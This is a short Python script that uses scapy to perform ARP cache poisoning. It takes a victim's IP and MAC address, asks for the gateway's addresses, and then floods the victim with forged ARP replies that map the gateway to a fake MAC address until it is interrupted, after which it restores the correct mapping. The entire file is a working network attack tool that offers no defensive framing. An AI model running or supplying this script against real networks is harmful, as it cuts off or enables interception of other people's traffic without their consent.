

import sys
import datetime
import optparse
from scapy.all import *

# function to parse command line args
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="ip_address", 
		help="Target IP.")
	parser.add_option("-m", "--mac", dest="mac_address", 
		help="Target MAC.")
	options, arguments = parser.parse_args()
	return options

def poison(victim_ip, victim_mac, gateway_ip):
	# Send the victim an ARP packet pairing the gateway ip with the wrong
	# mac address
	packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
	send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
	# Send the victim an ARP packet pairing the gateway ip with the correct
	# mac address
	packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
	send(packet, verbose=0)

options = get_arguments()
victim_ip = options.ip_address
victim_mac = options.mac_address

# obtain gateway information
gateway_ip = raw_input('[*] AP address: ')
gateway_mac = raw_input('[*] AP MAC address: ')

try:
	print("Spoofing target...")
	while True:
		poison(victim_ip, victim_mac, gateway_ip)
except KeyboardInterrupt:
	print("Quitting...")
	restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
	sys.exit(0) # quite and raise no error code

